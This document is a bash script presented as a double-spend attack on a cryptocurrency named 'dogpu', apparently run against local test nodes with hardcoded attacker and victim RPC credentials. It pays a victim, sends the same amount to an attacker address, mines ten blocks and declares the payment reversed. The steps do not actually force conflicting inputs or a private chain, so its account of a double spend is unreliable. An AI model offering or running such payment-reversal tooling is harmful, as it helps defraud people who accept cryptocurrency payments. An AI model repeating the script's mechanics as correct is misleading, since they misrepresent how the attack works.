#!/bin/bash
echo "💀 EXECUTING DOUBLE SPEND ATTACK"
echo "================================="

# Step 1: Create transaction to victim
echo "1. Creating transaction to victim..."
VICTIM_ADDR=$(./dogpu-cli -rpcport=8336 -rpcuser=victim -rpcpassword=victim123 getnewaddress)
echo "Victim address: $VICTIM_ADDR"

# Step 2: Send coins to victim (this will be double-spent)
echo "2. Sending coins to victim..."
TXID=$(./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 sendtoaddress $VICTIM_ADDR 100)
echo "Transaction ID: $TXID"

# Step 3: Wait for victim to see transaction
echo "3. Waiting for victim to see transaction..."
sleep 10

# Step 4: Create conflicting transaction (double spend)
echo "4. Creating conflicting transaction..."
ATTACKER_ADDR=$(./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 getnewaddress)
./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 sendtoaddress $ATTACKER_ADDR 100

# Step 5: Mine private chain with superior hashpower
echo "5. Mining private chain with superior hashpower..."
./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 generate 10

echo "💀 Double spend attack executed!"
echo "Check victim node - the original transaction should be reversed"
